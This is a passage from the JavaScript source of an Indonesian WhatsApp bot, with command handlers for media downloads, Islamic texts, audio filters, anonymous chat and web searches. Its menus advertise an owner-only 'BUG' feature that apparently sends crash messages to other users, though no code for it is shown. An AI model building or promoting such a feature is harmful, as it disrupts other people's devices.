                ikycoli.sendMessage(m.chat, { video: { url: anu.result }, caption: `Download From ${text}` }, { quoted: m })
            }
            break
            case 'umma': case 'ummadl': {
            if (!isCreator && !isBan) return
	        if (!text) throw `Example : ${prefix + command} https://umma.id/channel/video/post/gus-arafat-sumber-kecewa-84464612933698`
                let { umma } = require('./lib) scraper')
		let anu = await umma(isUrl(text)[0])
		if (anu.type == 'video') {
		    let buttons = [
                        {buttonId: `ytmp3 ${anu.media[0]} 128kbps`, buttonText: {displayText: '♫ Audio'}, type: 1},
                        {buttonId: `ytmp4 ${anu.media[0]} 360p`, buttonText: {displayText: '► Video'}, type: 1}
                    ]
		    let buttonMessage = {
		        image: { url: anu.author.profilePic },
			caption: `
││᭄⃟ꪶ⃟•╾ Title : ${anu.title}
││᭄⃟ꪶ⃟•╾ Author : ${anu.author.name}
││᭄⃟ꪶ⃟•╾ Like : ${anu.like}
││᭄⃟ꪶ⃟•╾ Caption : ${anu.caption}
││᭄⃟ꪶ⃟•╾ Url : ${anu.media[0]}
Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan command ytmp3/ytmp4 dengan url diatas
`,
			footer: ikycoli.user.name,
			buttons,
			headerType: 4
		    }
		    ikycoli.sendMessage(m.chat, buttonMessage, { quoted: m })
		} else if (anu.type == 'image') {
		    anu.media.map(async (url) => {
		        ikycoli.sendMessage(m.chat, { image: { url }, caption: `││᭄⃟ꪶ⃟•╾ Title : ${anu.title}\n││᭄⃟ꪶ⃟•╾ Author : ${anu.author.name}\n││᭄⃟ꪶ⃟•╾ Like : ${anu.like}\n││᭄⃟ꪶ⃟•╾ Caption : ${anu.caption}` }, { quoted: m })
		    })
		}
	    }
	    break
        case 'ringtone': {
        if (!isCreator && !isBan) return
		if (!text) throw `Example : ${prefix + command} black rover`
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		ikycoli.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
		case 'iqra': {
		if (!isCreator && !isBan) return
		oh = `Example : ${prefix + command} 3\n\nIQRA Yang tersedia : 1,2,3,4,5,6`
		if (!text) throw oh
		yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
		ikycoli.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
		}
		break
		case 'juzamma': {
		if (!isCreator && !isBan) return
		if (args[0] === 'pdf') {
		m.reply(mess.wait)
		ikycoli.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pdf'}, mimetype: 'application/pdf', fileName: 'juz-amma-arab-latin-indonesia.pdf'}, {quoted:m})
		} else if (args[0] === 'docx') {
		m.reply(mess.wait)
		ikycoli.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.docx'}, mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', fileName: 'juz-amma-arab-latin-indonesia.docx'}, {quoted:m})
		} else if (args[0] === 'pptx') {
		m.reply(mess.wait)
		ikycoli.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.pptx'}, mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation', fileName: 'juz-amma-arab-latin-indonesia.pptx'}, {quoted:m})
		} else if (args[0] === 'xlsx') {
		m.reply(mess.wait)
		ikycoli.sendMessage(m.chat, {document: {url: 'https://fatiharridho.my.id/database/islam/juz-amma-arab-latin-indonesia.xlsx'}, mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', fileName: 'juz-amma-arab-latin-indonesia.xlsx'}, {quoted:m})
		} else {
		m.reply(`Mau format apa ? Example : ${prefix + command} pdf

Format yang tersedia : pdf, docx, pptx, xlsx`)
		}
		}
		break
		case 'hadis': case 'hadist': {
		if (!isCreator && !isBan) return
		if (!args[0]) throw `Contoh:
${prefix + command} bukhari 1
${prefix + command} abu-daud 1

Pilihan tersedia:
abu-daud
1 - 4590
ahmad
1 - 26363
bukhari
1 - 7008
darimi
1 - 3367
ibnu-majah
1 - 4331
nasai
1 - 5662
malik
1 - 1594
muslim
1 - 5362`
		if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} muslim 1`
		try {
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/json/hadith/${args[0]}`)
		let { number, arab, id } = res.find(v => v.number == args[1])
		m.reply(`No. ${number}

${arab}

${id}`)
		} catch (e) {
		m.reply(`Hadis tidak ditemukan !`)
		}
		}
		break
		case 'alquran': {
		if (!isCreator && !isBan) return
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		ikycoli.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : m })
		}
		break
		case 'tafsirsurah': {
		if (!isCreator && !isBan) return
		if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
		let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
		let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
		m.reply(txt)
		}
		break
		   case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'tupai':
		   if (!isCreator && !isBan) return
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await ikycoli.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                ikycoli.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
            case 'setcmd': {
            if (!isCreator) return
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
            if (!isCreator && !isBan) return
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
            if (!isCreator && !isBan) return
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                ikycoli.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator && !isBan) return
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case 'addmsg': {
            if (!isCreator && !isBan) return
                if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
m.reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
            if (!isCreator && !isBan) return
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                ikycoli.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
            if (!isCreator && !isBan) return
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
            if (!isCreator && !isBan) return
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		m.reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
	    case 'anonymous': {
	    if (!isCreator && !isBan) return
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
                    { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                ]
                ikycoli.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await ikycoli.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, ikycoli.user.name, m)
            }
			break
            case 'keluar': case 'leave': {
            if (!isCreator && !isBan) return
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await ikycoli.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await ikycoli.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case 'mulai': case 'start': {
            if (!isCreator && !isBan) return
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await ikycoli.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, ikycoli.user.name, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await ikycoli.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, ikycoli.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await ikycoli.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, ikycoli.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await ikycoli.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, ikycoli.user.name, m)
                }
                break
            }
            case 'next': case 'lanjut': {
            if (!isCreator && !isBan) return
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await ikycoli.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await ikycoli.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await ikycoli.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, ikycoli.user.name, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await ikycoli.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, ikycoli.user.name, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await ikycoli.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, ikycoli.user.name, m)
                }
                break
            }
            case 'public': {
                if (!isCreator) return
                ikycoli.public = true
                m.reply('Sukse Change To Public Usage')
            }
            break
            case 'self': {
                if (!isCreator) return
                ikycoli.public = false
                m.reply('Sukses Change To Self Usage')
            }
            break
            
            case 'ping': case 'pingiky': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon) 
            }
            break
            case 'speedtest': {
            m.reply('Testing Speed...')
            let cp = require('child_process')
            let { promisify } = require('util')
            let exec = promisify(cp.exec).bind(cp)
          let o
          try {
          o = await exec('python speed.py')
          } catch (e) {
          o = e
         } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) m.reply(stdout)
        if (stderr.trim()) m.reply(stderr)
            }
            }
            break
            case 'owner': case 'creator': {
                ikycoli.sendContact(m.chat, global.owner, m)
            }
            break
            case 'playstore': {
            if (!isCreator) return
            if (!text) throw `Example : ${prefix + command} clash of clans`
            let res = await fetchJson(api('zenz', '/webzone/playstore', { query: text }, 'apikey'))
            let teks = `││᭄⃟ꪶ⃟•╾ Playstore Search From : ${text}\n\n`
            for (let i of res.result) {
            teks += `││᭄⃟ꪶ⃟•╾ Name : ${i.name}\n`
            teks += `││᭄⃟ꪶ⃟•╾ Link : ${i.link}\n`
            teks += `││᭄⃟ꪶ⃟•╾ Developer : ${i.developer}\n`
            teks += `││᭄⃟ꪶ⃟•╾ Link Developer : ${i.link_dev}\n\n──────────────────────\n`
            }
            m.reply(teks)
            }
            break
            case 'gsmarena': {
            if (!isCreator) return
            if (!text) throw `Example : ${prefix + command} samsung`
            let res = await fetchJson(api('zenz', '/webzone/gsmarena', { query: text }, 'apikey'))
            let { judul, rilis, thumb, ukuran, type, storage, display, inchi, pixel, videoPixel, ram, chipset, batrai, merek_batre, detail } = res.result
let capt = `││᭄⃟ꪶ⃟•╾ Title: ${judul}
││᭄⃟ꪶ⃟•╾ Realease: ${rilis}
││᭄⃟ꪶ⃟•╾ Size: ${ukuran}
││᭄⃟ꪶ⃟•╾ Type: ${type}
││᭄⃟ꪶ⃟•╾ Storage: ${storage}
││᭄⃟ꪶ⃟•╾ Display: ${display}
││᭄⃟ꪶ⃟•╾ Inchi: ${inchi}
││᭄⃟ꪶ⃟•╾ Pixel: ${pixel}
││᭄⃟ꪶ⃟•╾ Video Pixel: ${videoPixel}
││᭄⃟ꪶ⃟•╾ Ram: ${ram}
││᭄⃟ꪶ⃟•╾ Chipset: ${chipset}
││᭄⃟ꪶ⃟•╾ Battery: ${batrai}
││᭄⃟ꪶ⃟•╾ Battery Brand: ${merek_batre}
││᭄⃟ꪶ⃟•╾ Detail: ${detail}`
            ikycoli.sendImage(m.chat, thumb, capt, m)
            }
            break
            case 'jadwalbioskop': {
            if (!isCreator) return
            if (!text) throw `Example: ${prefix + command} jakarta`
            let res = await fetchJson(api('zenz', '/webzone/jadwalbioskop', { kota: text }, 'apikey'))
            let capt = `Jadwal Bioskop From : ${text}\n\n`
            for (let i of res.result){
            capt += `││᭄⃟ꪶ⃟•╾ Title: ${i.title}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Thumbnail: ${i.thumb}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Url: ${i.url}\n\n──────────────────────\n`
            }
            ikycoli.sendImage(m.chat, res.result[0].thumb, capt, m)
            }
            break
            case 'nowplayingbioskop': {
            if (!isCreator) return
            let res = await fetchJson(api('zenz', '/webzone/nowplayingbioskop', {}, 'apikey'))
            let capt = `Now Playing Bioskop\n\n`
            for (let i of res.result){
            capt += `││᭄⃟ꪶ⃟•╾ Title: ${i.title}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Url: ${i.url}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Img Url: ${i.img}\n\n──────────────────────\n`
            }
            ikycoli.sendImage(m.chat, res.result[0].img, capt, m)
            }
            break
            case 'aminio': {
            if (!isCreator) return
            if (!text) throw `Example: ${prefix + command} free fire`
            let res = await fetchJson(api('zenz', '/webzone/amino', { query: text }, 'apikey'))
            let capt = `Amino Search From : ${text}\n\n`
            for (let i of res.result){
            capt += `││᭄⃟ꪶ⃟•╾ Community: ${i.community}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Community Link: ${i.community_link}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Thumbnail: ${i.community_thumb}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Description: ${i.community_desc}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Member Count: ${i.member_count}\n\n──────────────────────\n`
            }
            ikycoli.sendImage(m.chat, 'https://'+res.result[0].community_thumb, capt, m)
            }
            break
            case 'wattpad': {
            if (!isCreator) return
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/wattpad', { query: text }, 'apikey'))
            let { judul, dibaca, divote, bab, waktu, url, thumb, description } = res.result[0]
            let capt = `Wattpad From ${text}\n\n`
            capt += `││᭄⃟ꪶ⃟•╾ Judul: ${judul}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Dibaca: ${dibaca}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Divote: ${divote}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Bab: ${bab}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Waktu: ${waktu}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Url: ${url}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Deskripsi: ${description}`
            ikycoli.sendImage(m.chat, thumb, capt, m)
            }
            break
            case 'webtoons': {
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/webtoons', { query: text }, 'apikey'))
            let capt = `Webtoons Search From : ${text}\n\n`
            for (let i of res.result) {
            capt += `││᭄⃟ꪶ⃟•╾ Judul: ${i.judul}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Like: ${i.like}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Creator: ${i.creator}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Genre: ${i.genre}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Url: ${i.url}\n\n──────────────────────\n`
            }
            m.reply(capt)
            }
            break
            case 'drakor': {
            if (!isCreator) return
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/drakor', { query: text }, 'apikey'))
            let capt = `Drakor Search From : ${text}\n\n`
            for (let i of res.result) {
            capt += `││᭄⃟ꪶ⃟•╾ Judul: ${i.judul}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Years: ${i.years}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Genre: ${i.genre}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Url: ${i.url}\n`
            capt += `││᭄⃟ꪶ⃟•╾ Thumbnail Url: ${i.thumbnail}\n\n──────────────────────\n`
            }
            ikycoli.sendImage(m.chat, res.result[0].thumbnail, capt, m)
            }
            break
            case 'setmenu': {
            if (!isCreator) return
            let setbot = db.data.settings[botNumber]
               if (args[0] === 'templateImage'){
                setbot.templateImage = true
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateVideo'){
                setbot.templateImage = false
                setbot.templateVideo = true
                setbot.templateGif = false
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateGif'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = true
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateMessage'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = true
                m.reply(mess.success)
                } else {
                let sections = [
                {
                title: "CHANGE MENU BOT",
                rows: [
                {title: "Template Image", rowId: `setmenu templateImage`, description: `Change menu bot to Template Image`},
                {title: "Template Video", rowId: `setmenu templateVideo`, description: `Change menu bot to Template Video`},
                {title: "Template Gif", rowId: `setmenu templateGif`, description: `Change menu bot to Template Gif`},
                {title: "Template Message", rowId: `setmenu templateMessage`, description: `Change menu bot to Template Message`}
                ]
                },
                ]
                ikycoli.sendListMsg(m.chat, `Please select the menu you want to change!`, ikycoli.user.name, `Hello Owner !`, `Click Here`, sections, m)
                }
            }
            break
case 'menu': case 'menuiky': case 'menubotiky': { 
ikycoli.sendMessage(m.chat, {audio: fs.readFileSync('./src/iky.mp3'), mimetype: 'audio/mpeg', ptt:true })
 menunya = `
▇◤▔▔▔▔▔▔▔◥▇
▇▏◥▇◣┊◢▇◤▕▇
▇▏▃▆▅▎▅▆▃▕▇
▇▏╱▔▕▎▔▔╲▕▇
▇◣◣▃▅▎▅▃◢◢▇
▇▇◣◥▅▅▅◤◢▇▇
▇▇▇◣╲▇╱◢▇▇▇ 
▰▱▰▱▰▱▰▱▰▱▰▱▰
╭─────────────────╮
│      ◪〘 MENU BOT 〙◪
│  OWNER : ${ownername}
╰─────────────────╮
╭─────────────────╯
├⊱❏ BUGIKY ( fitur khusus owner!! ) 
├⊱❏ FUNMENU 
├⊱❏ MAINMENU 
├⊱❏ VOICEMENU 
├⊱❏ GROUPMENU ( fitur khusus owner!! ) 
├⊱❏ OWNERMENU ( fitur khusus owner!!! ) 
├⊱❏ ISLAMICMENU 
├⊱❏ SEARCHMENU 
├⊱❏ EPHOTOMENU 
├⊱❏ RANDOMMENU 
├⊱❏ TEKSPROMENU 
├⊱❏ PRIMBONMENU 
├⊱❏ CONVERTMENU 
├⊱❏ WEBZONEMENU
├⊱❏ DATABASEMENU 
├⊱❏ PHOTOOXYMENU
├⊱❏ DOWNLOADMENU
├⊱❏ ANONYMOUSMENU
│⊱❏ IKYALLMENU
│⊱❏ EXTRAFITURBYIKY
╰─────────────────╯
▰▱▰▱▰▱▰▱▰▱▰▱▰
[🇮🇩]𝐁𝐄𝐑𝐏𝐈𝐊𝐈𝐑𝐋𝐀𝐇 𝐏𝐎𝐒𝐈𝐓𝐈𝐅 𝐓𝐈𝐃𝐀𝐊 𝐏𝐄𝐃𝐔𝐋𝐈 𝐒𝐄𝐁𝐄𝐑𝐀𝐏𝐀 𝐊𝐄𝐑𝐀𝐒 𝐊𝐄𝐇𝐈𝐃𝐔𝐏𝐀𝐍 𝐌𝐔
-𝐈𝐊𝐘𝐌𝐀𝐊𝐄𝐑𝐙

© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥
`
image = fs.readFileSync('./lib/jo.jpg'),
ikycoli.sendMessage(m.chat, { image: image, contextInfo: { mentionedJid: [m.key] }, caption: menunya })
}
break
case 'listmenu': case 'ikylist':{
if (!isCreator && !isBan) return
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
listMessage :{
title: `SILAHKAN PILIH MENU NYA`,
description: "PILIH DI DALAM LIST",
buttonText: "CLICK DISINI",
footerText: "",
listType: "SINGLE_SELECT",
sections: [{
"title": "BUG MENU",
"rows": [
{
"title": "BUG IKY",
"description": "© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥",
"rowId": `${prefix}bugiky`
}
]
},
{
"title": "OWNER MENU",
"rows": [
{
"title": "OWNER MENU",
"description": "© ⏤͟͟͞𝙏𝙃𝙀 𝙄𝙆𝙔𝙔 𝘽𝙊𝙏𝙕🔥",
"rowId": `${prefix}ownermenu`
}
]
},
{
"title": "GRUP MENU",
"rows": [
{
"title": "GRUP MENU",
